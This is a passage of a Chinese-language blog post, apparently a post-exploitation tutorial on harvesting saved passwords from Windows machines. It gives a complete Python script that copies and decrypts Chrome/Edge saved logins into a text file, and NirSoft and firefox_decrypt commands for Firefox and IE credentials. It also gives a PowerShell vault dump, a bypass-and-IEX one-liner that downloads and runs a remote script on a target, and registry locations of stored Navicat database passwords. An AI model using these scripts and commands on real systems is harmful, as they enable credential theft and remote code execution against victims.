row[<span class="number">1</span>]</span><br><span class="line">            value = self.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######åŠ å¯†æ–¹å¼æ”¹è®Šåçš„é‡é»ä½ç½®</span></span><br><span class="line">            <span class="comment">#å¯†ç è§£æåå¾—åˆ°å­—èŠ‚ç ï¼Œéœ€è¦è¿›è¡Œè§£ç æ“ä½œ</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_passwords</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h3 id="Firefoxæµè§ˆå™¨æ•°æ®"><a href="#Firefoxæµè§ˆå™¨æ•°æ®" class="headerlink" title="Firefoxæµè§ˆå™¨æ•°æ®"></a>Firefoxæµè§ˆå™¨æ•°æ®</h3><p>æ‰€æœ‰çš„å¯†ç ä¿å­˜ä½ç½®åœ¨<code>%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\</code>(xxxxxxxxä¸º8ä½éšæœºå­—æ¯å’Œæ•°å­—çš„ç»„åˆ)</p><p>ä¸åŒç‰ˆæœ¬çš„Firefoxä¿å­˜è®°å½•çš„æ–‡ä»¶åç§°ä¸åŒï¼Œå…·ä½“åŒºåˆ«å¦‚ä¸‹ï¼š</p><ul><li><p>Versionå¤§äºç­‰äº32.0ï¼Œä¿å­˜è®°å½•çš„æ–‡ä»¶ä¸ºlogins.json</p></li><li><p>Versionå¤§äºç­‰äº3.5ï¼Œå°äº32.0ï¼Œä¿å­˜è®°å½•çš„æ–‡ä»¶ä¸ºsignons.sqlite</p></li></ul><p>ä¸åŒç‰ˆæœ¬çš„Firefoxå¯†é’¥æ–‡ä»¶çš„ä½ç½®ä¸åŒï¼Œå…·ä½“åŒºåˆ«å¦‚ä¸‹ï¼š</p><ul><li><p>Versionå°äº58.0.2ï¼Œå¯†é’¥æ–‡ä»¶ä¸ºkey3.db</p></li><li><p>Versionå¤§äºç­‰äº58.0.2ï¼Œå¯†é’¥æ–‡ä»¶ä¸ºkey4.db</p></li></ul><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“å‰ç”¨æˆ·çš„æƒé™å¯ä»¥æŸ¥çœ‹Firefoxæµè§ˆå™¨ä¸­ä¿å­˜çš„æ‰€æœ‰å¯†ç ï¼Œä¸ºäº†æé«˜å®‰å…¨æ€§ï¼ŒFirefoxæµè§ˆå™¨æ”¯æŒä¸ºä¿å­˜çš„å¯†ç æ·»åŠ é¢å¤–çš„ä¿æŠ¤ï¼šè®¾ç½®Master Passwordã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/11.png" alt="image-20210609191949114"></p><p>æ·»åŠ Master Passwordåï¼ŒæŸ¥çœ‹ä¿å­˜çš„å¯†ç éœ€è¦é¢å¤–è¾“å…¥Master Passwordã€‚</p><p>è§£å¯†æµç¨‹ï¼š</p><ul><li><p>è¯»å–å¯†é’¥æ–‡ä»¶(key4.dbæˆ–key3.db)ï¼Œè·å¾—keyå’Œiv</p></li><li><p>è¯»å–è®°å½•æ–‡ä»¶(logins.jsonæˆ–signons.sqlite)çš„å†…å®¹</p></li><li><p> å¦‚æœæœªè®¾ç½®Master Passwordï¼Œä½¿ç”¨keyå’Œivå¯¹è®°å½•æ–‡ä»¶ä¸­çš„åŠ å¯†å†…å®¹è¿›è¡Œ3DES-CBCè§£å¯†ã€‚å¦‚æœè®¾ç½®Master Passwordï¼Œè¿˜éœ€è¦è·å¾—æ˜æ–‡å½¢å¼çš„Master Passwordï¼Œæ‰èƒ½è¿›è¡Œè§£å¯†</p></li></ul><blockquote><p>æœªè®¾ç½®Master Passwordè§£å¯†</p></blockquote><p>WebBrowserPassViewï¼š<a href="https://www.nirsoft.net/password_recovery_tools.html">å®˜æ–¹ä¸‹è½½</a> <a href="https://github.com/Ascotbe/Random-img/blob/master/WindowsGrabPassword/WebBrowserPassView.exe">å¤‡ä»½ä¸‹è½½</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\WebBrowserPassView.exe &#x2F;LoadPasswordsFirefox 1 &#x2F;shtml &quot;C:\Users\ascotbe\Desktop\passwords.html&quot;</span><br></pre></td></tr></table></figure><p>è¿˜èƒ½æŠŠè°·æ­Œæœ€æ–°ç‰ˆæœ¬çš„ç§˜é’¥ç»™è§£å¯†äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/12.png" alt="image-20210609192420620"></p><blockquote><p>è®¾ç½®Master Passwordè§£å¯†</p></blockquote><p>firefox_decryptï¼š<a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">å®˜æ–¹ä¸‹è½½</a></p><p>è§£å¯†éœ€è¦è·å–åˆ°ç”¨æˆ·è®¾ç½®çš„Master Passwordæ‰è¡Œï¼Œè§£å¯†å·¥å…·åˆ«ä½¿ç”¨1.0ç‰ˆæœ¬ï¼Œé—®é¢˜å¾ˆå¤š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/13.png" alt="image-20210609194828114"></p><h3 id="IE-æµè§ˆå™¨æ•°æ®"><a href="#IE-æµè§ˆå™¨æ•°æ®" class="headerlink" title="IE æµè§ˆå™¨æ•°æ®"></a>IE æµè§ˆå™¨æ•°æ®</h3><p>é¦–å…ˆéœ€è¦æ‰“å¼€æµè§ˆå™¨çš„è®°ä½å¯†ç åŠŸèƒ½ï¼šå·¥å…·-&gt;Internet é€‰é¡¹-&gt;å†…å®¹-&gt;è‡ªåŠ¨å®Œæˆ-&gt;å‹¾é€‰è¡¨å•ä¸Šçš„ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/14.png" alt="image-20210610095248052"></p><blockquote><p>è¿œç¨‹ä¸‹è½½æ‰§è¡Œï¼ˆéœ€è¦å¼€å¯PSå¯æ‰§è¡Œï¼‰</p></blockquote><p>ç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼Œç›®å‰GitHubå›½å†…æ— æ³•è®¿é—®ï¼Œæ¨èä½¿ç”¨è‡ªå·±æœåŠ¡å™¨å­˜æ”¾è„šæœ¬æˆ–è€…ä½¿ç”¨ç¬¬ä¸‰æ–¹æº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;bit.ly&#x2F;2K75g15&#39;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/15.png" alt="image-20210610100850268"></p><blockquote><p>æœ¬åœ°æ‰§è¡Œï¼ˆéœ€è¦å¼€å¯PSå¯æ‰§è¡Œï¼‰</p></blockquote><p>ç›´æ¥æŠŠPS1æ–‡ä»¶æ”¾åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œæ‰§è¡Œå°±å¥½äº†</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">void</span>][<span class="type">Windows.Security.Credentials.PasswordVault</span>,<span class="type">Windows.Security.Credentials</span>,<span class="type">ContentType</span>=<span class="type">WindowsRuntime</span>]</span><br><span class="line"><span class="variable">$vault</span> = <span class="built_in">New-Object</span> Windows.Security.Credentials.PasswordVault</span><br><span class="line"><span class="variable">$vault</span>.RetrieveAll() | % &#123; <span class="variable">$_</span>.RetrievePassword();<span class="variable">$_</span> &#125; | <span class="built_in">select</span> username,resource,password</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/16.png" alt="image-20210610101513741"></p><blockquote><p>è½åœ°æ–‡ä»¶æ‰§è¡Œ</p></blockquote><p>IE PassViewï¼š<a href="https://www.nirsoft.net/utils/internet_explorer_password.html">å®˜æ–¹ä¸‹è½½</a>  <a href="https://github.com/Ascotbe/Random-img/blob/master/WindowsGrabPassword/ViewPass.exe">å¤‡ä»½ä¸‹è½½</a></p><p>ç›´æ¥æŠŠæ–‡ä»¶åŒå‡»å³å¯çœ‹åˆ°å¯†ç </p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/17.png" alt="image-20210610105509664"></p><h3 id="Edgeæµè§ˆå™¨æ•°æ®"><a href="#Edgeæµè§ˆå™¨æ•°æ®" class="headerlink" title="Edgeæµè§ˆå™¨æ•°æ®"></a>Edgeæµè§ˆå™¨æ•°æ®</h3><p>ç”±äºå¾®è½¯å°±å¥—äº†ä¸€å±‚å£³ï¼ŒåŠ å¯†æ–¹å¼å®Œå…¨æ²¡æœ‰ä¿®æ”¹ï¼Œå€¼ä¿®æ”¹äº†æ•°æ®ä¿å­˜çš„è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹ä¸Šé¢Chromeçš„è„šæœ¬å³å¯è·å–æˆåŠŸ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#æ•°æ®åº“è·¯å¾„</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Default\Login Data</span><br><span class="line">#ç§˜é’¥è·¯å¾„</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Local State</span><br></pre></td></tr></table></figure><p>è„šæœ¬ä¿®æ”¹å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Microsoft\Edge\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span></span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span></span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cipher</span>(<span class="params">key</span>):</span></span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span></span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DATA_BLOB</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unix_decrypt</span>(<span class="params">encrypted</span>):</span></span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key_from_local_state</span>():</span></span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Microsoft\Edge\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span></span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChromePassword</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_chrome_db</span>(<span class="params">self</span>):</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_password</span>(<span class="params">self,db_file</span>):</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = self.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######åŠ å¯†æ–¹å¼æ”¹è®Šåçš„é‡é»ä½ç½®</span></span><br><span class="line">            <span class="comment">#å¯†ç è§£æåå¾—åˆ°å­—èŠ‚ç ï¼Œéœ€è¦è¿›è¡Œè§£ç æ“ä½œ</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_passwords</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®åº“å¯†ç "><a href="#æ•°æ®åº“å¯†ç " class="headerlink" title="æ•°æ®åº“å¯†ç "></a>æ•°æ®åº“å¯†ç </h2><h3 id="Navicatå¯†ç "><a href="#Navicatå¯†ç " class="headerlink" title="Navicatå¯†ç "></a>Navicatå¯†ç </h3><p>ç›®å‰æµ‹è¯•åªèƒ½è§£å¯†11å’Œ12ä¸¤ä¸ªç‰ˆæœ¬ï¼Œå…¶ä»–ç‰ˆæœ¬æœªæµ‹è¯•</p><table><thead><tr><th align="left">æ•°æ®åº“ç±»å‹</th><th align="center">æ³¨å†Œè¡¨è·¯å¾„</th></tr></thead><tbody><tr><td align="left">MySQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers</td></tr><tr><td align="left">MariaDB</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers</td></tr><tr><td align="left">MongoDB</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers</td></tr><tr><td align="left">Microsoft SQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers</td></tr><tr><td align="left">Oracle</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers</td></tr><tr><td align="left">PostgreSQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers</td></tr><tr><td align="left">SQLite</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers</td></tr></tbody></table><h4 id="èƒ½RDPè¿æ¥åˆ°æœºå™¨"><a href="#èƒ½RDPè¿æ¥åˆ°æœºå™¨" class="headerlink" title="èƒ½RDPè¿æ¥åˆ°æœºå™¨"></a>èƒ½RDPè¿æ¥åˆ°æœºå™¨</h4><p>å½“å‰å·²Mysqlä½œä¸ºæµ‹è¯•æ ·ä¾‹ï¼Œé€šè¿‡æ³¨å†Œåˆ—è¡¨ä¸­æŸ¥çœ‹ï¼Œä½ç½®å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/18.png" alt="image-20210610163933891"></p><p>æ¥ç€æŠŠåŠ å¯†çš„å¯†ç å¤åˆ¶å‡ºæ¥è¿›è¡Œè§£å¯†ï¼Œè„šæœ¬å¦‚ä¸‹ï¼Œå¦‚æœæœ¬æœºæ²¡æœ‰PHPç¯å¢ƒå¯ä»¥ä½¿ç”¨<a href="https://tool.lu/coderunner/">åœ¨çº¿ç½‘ç«™</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 